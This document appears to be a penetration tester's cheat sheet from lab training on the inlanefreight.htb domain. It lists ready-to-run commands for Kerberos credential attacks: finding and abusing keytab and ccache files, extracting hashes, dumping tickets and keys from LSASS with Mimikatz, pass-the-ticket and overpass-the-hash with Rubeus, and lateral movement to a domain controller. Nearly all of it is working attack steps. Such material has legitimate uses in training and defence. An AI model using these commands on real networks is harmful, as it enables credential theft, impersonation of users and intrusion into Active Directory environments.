
## Linux 

```bash
# Linux auth via port forward
ssh david@inlanefreight.htb@10.129.204.23 -p 2222

# -----  Identifying Linux and Active Directory integration -----------

# Check if Linux machine is domain-joined
realm list

# Check if Linux machine is domain-joined
ps -ef | grep -i "winbind\\|sssd"

# ------------- Finding Kerberos tickets in Linux -------------

# Search for Keytab Files
find / -name *keytab* -ls 2>/dev/null

# Reviewing environment variables for ccache files.
env | grep -i krb5

# Searching for ccache files in /tmp
ls -la /tmp

# ---------------- Abusing KeyTab files -----------------

# Listing KeyTab file information
klist -k -t /opt/specialfiles/carlos.keytab 

# Impersonating a user with a KeyTab
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

# Connecting to SMB Share as Carlos
smbclient //dc01/carlos -k -c ls

# --------- KeyTab Extract --------------

# Extracting KeyTab hashes with KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

# Hash-in provojm ta thyej me hashcat ose John The Ripper

# Log in as Carlos, if we crack password
su - carlos@inlanefreight.htb

# Importing the ccache file into our current session
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass

# Convert a Linux Kerberos Ticket to .kirbi Format
impacket-ticketConverter krb5cc_647401106_I8I133 <filenme.kirbi>

# Pass the Ticket in Windows with Rubeus
C:\\tools\\Rubeus.exe ptt /ticket:c:\\tools\\julio.kirbi

# Use Linikatz (Linux Mimikatz Alternative)
wget <https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh>
/opt/linikatz.sh
```



---
## Rubeus

```bash
# Dump Kerberos Tickets from Memory
Rubeus.exe dump /nowrap

# Inject Base64 encoded ticket
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwI..

# Pass the Ticket From a Saved Kirbi File
Rubeus.exe ptt /ticket:"<filename.kirbi

# Convert .kirbi to Base64 Format
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

# Pass the Ticket - Base64 Format
Rubeus.exe ptt /ticket:doIE1jCCBN...

# Request a TGT Using AES256 Key (Pass-the-Key / OverPass-the-Hash)
Rubeus.exe  asktgt /domain:<domain> /user:<username> /aes256:<AES256_key> /nowrap

# Request and inject TGT using RC4 hash
Rubeus.exe asktgt /domain:<domain> /user:<username> /rc4:<hash> /ptt

# Rubeus - Pass the Ticket for Lateral Movement
Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<hash> /ptt

# Pass the Ticket for lateral movement
Enter-PSSession -ComputerName DC01

# Create a Sacrificial Process for Token Theft or Delegation
Rubeus.exe createnetonly /program:"C:\\Windows\\System32\\cmd.exe" /show
```


---
## Mimikatz

```bash
# Run mimikatz
mimikatz.exe

# Enable debug privileges (required for LSASS access)
privilege::debug

# Export all Kerberos tickets (.kirbi files)
sekurlsa::tickets /export
📌 Output: .kirbi files saved in current directory.

# Extract Kerberos encryption keys
sekurlsa::ekeys

# Check exported tickets in current directory
c:\\tools> dir *.kirbi

# # Inject specific Kerberos ticket into current session
kerberos::ptt "path/filename.kirbi"

# Pass-the-Hash variant using NTLM hash to run a process as the user
sekurlsa::pth /domain:<domain> /user:<username> /ntlm:<ntlm_hash>

# Use injected ticket for remote access
Enter-PSSession -ComputerName DC01
```



---
## Ticket Injection


```bash
# Create a Sacrificial Process with Rubeus
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Reading Tickets who are in memori
.\Rubeus.exe triage

# Reviewing Ticket Associated with our Session
klist

# Extracting the ticket with Rubeus
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap

# Ask for new TGT
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt

# Displaying the Ticket with klist
klist

# Read Domain Controller's File System
dir \\dc01\\c$

# Identifying the TGS ticket Created from the TGT
klist
```